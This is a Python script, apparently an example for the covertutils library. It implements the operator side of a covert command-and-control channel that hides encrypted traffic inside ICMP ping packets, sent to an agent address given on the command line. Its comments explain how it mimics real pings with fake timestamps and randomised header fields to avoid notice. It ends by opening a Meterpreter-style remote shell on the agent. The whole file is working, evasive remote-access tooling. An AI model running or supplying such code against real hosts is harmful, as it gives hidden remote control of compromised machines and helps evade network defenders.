#!/usr/bin/env python
#============================== Imports part =============================

from covertutils.handlers import ResponseOnlyHandler
from covertutils.orchestration import SimpleOrchestrator

from covertutils.shells.impl import ExtendableShell, MeterpreterShell

from scapy.all import sniff, IP, ICMP, Raw		# Never bloat scapy import with *
from scapy.all import send as scapy_send	# unexpected things will happen

from threading import Thread		# Need a thread for running a sniffer
from time import sleep			# I spin lock a lot

from random import randint		# Generating ICMP and IP id fields needs randomness
from struct import pack			# packing a unixtime in Pings is key
import time						# used for unixtime

import sys						# Used for arguments


agent_address = sys.argv[1]		# Where the Agent resides (aka RHOST)
passphrase = sys.argv[2]		# What is the passphrase the agent uses
delay_secs = float(sys.argv[3])	# Delay between Pings sent. 1 sec is slow but realistic


#============================== Networking part ===========================
# The networking is handled by Python and Scapy. No 'covertutils' code here...

icmp_packets = []		# Packets captured by sniffer will be stored here
icmp_seq = 1		# The initial Ping sequence value is 1/256
icmp_id = randint( 0, 65535 )	# The sequence value is the same on every packet for every execution of 'ping'


def add_icmp_packet( pkt ) :	# wrapper function to add a packet to the list
	global icmp_packets
	icmp_packets.append( pkt )


def collect_icmp() :		# Scappy non terminating sniffer
	cap_filter = "icmp[icmptype] == icmp-echoreply"		# that captures echo replies
	sniff( filter = cap_filter, prn = add_icmp_packet )	 # runs forever


def get_icmp_timestamp( ) :		# function returns UNIX time in 4 bytes Little Endian
	return pack("<I", int(time.time()))


def recv( ) :		# Networking Wrapper function needed for the handler
	while not icmp_packets :	# Blocks when no packet is available
		sleep(0.01)

	pkt = icmp_packets.pop(0)	# Get the first packet
	raw_data = str(pkt[Raw])[4:]		# Remove the UNIX timestamp
	return raw_data		# Return the raw data to Handler


def send( raw_data ) :	# Networking Wrapper function needed for the handler
	sleep( delay_secs )		# Delay before next Ping
	ip_id = randint( 0, 65535 )	# Calculate random header values to simulate real packets
	payload = get_icmp_timestamp() + raw_data	# the payload starts with UNIX time to simulate real ping
	pkt = IP( dst = agent_address, id = ip_id, flags = 'DF' )/ICMP( type = "echo-request", id = icmp_id, seq = icmp_seq )/Raw( payload )
	scapy_send( pkt, verbose = False )		# Make and send a Raw Packet


sniff_thread = Thread( target = collect_icmp )
sniff_thread.daemon = True
sniff_thread.start()			# Run the ICMP reply collector in a thread
#==========================================================================


#============================== Handler Overriding part ===================

#	ResponseOnlyHandler because the Agent never sends packet adHoc but only as responses
#		(Except if we use adHocSend() by hand - later in Shell creation)
class Handler( ResponseOnlyHandler ) :

	def onMessage( self, stream, message ) :	# When a Message arrives
		global icmp_seq		# Make the Ping Sequence Number 1/256 again
		icmp_seq = 1
		global icmp_id		# Simulate a new 'ping' execution
		icmp_id = randint( 0, 65535 )
		# The PrintShell class will automatically handle the response (print it to the user)


	def onChunk( self, stream, message ) :	# When a Chunk arrives
		# print "[+] Got a Chunk"
		global icmp_seq
		if not message :	# If it is not a complete message (but a part of one)
			icmp_seq += 1	# add one to the ICMP sequence
			self.queueSend( self.request_data, stream )	# Add a message to the send queue
			super( Handler, self ).onMessage( stream, self.request_data  )	# Run the ResponseOnlyHandler onMessage
			# That automatically responds with the next Message in queue when called. (Always responding to messages behavior)


	def onNotRecognised( self ) :	# When Junk arrives
		# print "[!] Unrecognised"
		pass			# Do nothing

#==========================================================================



#=============================Handler Creation=============================

orchestrator = SimpleOrchestrator( passphrase,	# Encryption keys generated from the passphrase
				tag_length = 3,		# The tag length in bytes
				out_length = 52,	# The absolute output byte length (with tags)
				in_length = 52,		# The absolute input byte length (with tags)
				streams = ['heartbeat'],	# Stream 'control' will be automatically added as failsafe mechanism
				reverse = True )	# Reverse the encryption channels - Agent has `reverse = False`

handler = Handler( recv, send, orchestrator )	# Instantiate the Handler object. Finally!
handler.preferred_send = handler.sendAdHoc	# Change the preferred method to use it with the shell.
# This way the shell will iterate a message sending and the ResponseOnlyHandler will do the ping-pong

#==========================================================================


#============================== Shell Design part ========================

shell = MeterpreterShell( handler, ignore_messages = set([ "X" ]) )
shell.start()


#==========================================================================

#	Magic!
